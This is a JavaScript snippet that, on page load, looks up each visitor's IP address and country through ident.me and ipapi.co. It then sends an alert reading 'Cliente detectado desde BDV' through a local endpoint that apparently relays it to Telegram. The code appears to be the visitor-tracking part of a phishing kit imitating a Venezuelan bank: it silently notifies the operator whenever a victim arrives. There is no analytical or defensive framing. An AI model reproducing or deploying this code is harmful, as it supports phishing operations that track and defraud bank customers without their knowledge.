function enviarMensajeTelegram(mensaje) {
    fetch('/enviar-alerta', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mensaje })
    })
    .then(response => {
        if (!response.ok) throw new Error("Error HTTP: " + response.status);
        return response.json();
    })
    .then(data => {
        console.log("Mensaje enviado a Telegram");
    })
    .catch(error => {
        console.error("Error al enviar mensaje a Telegram:", error);
    });
}

window.addEventListener("DOMContentLoaded", function() {
    fetch('https://ipv4.ident.me/json')
        .then(response => response.json())
        .then(data => {
            const ipv4 = data.ip;
            fetch(`https://ipapi.co/${ipv4}/json/`)
                .then(response => response.json())
                .then(countryData => {
                    const pais = countryData.country_name;
                    const mensajeAlerta = `🚨 Alerta 🚨\n📣 Cliente detectado desde BDV 🇻🇪\n🌐IP: ${ipv4} (${pais})`;
                    setTimeout(() => {
                        enviarMensajeTelegram(mensajeAlerta);
                    }, 1000);
                });
        });
});
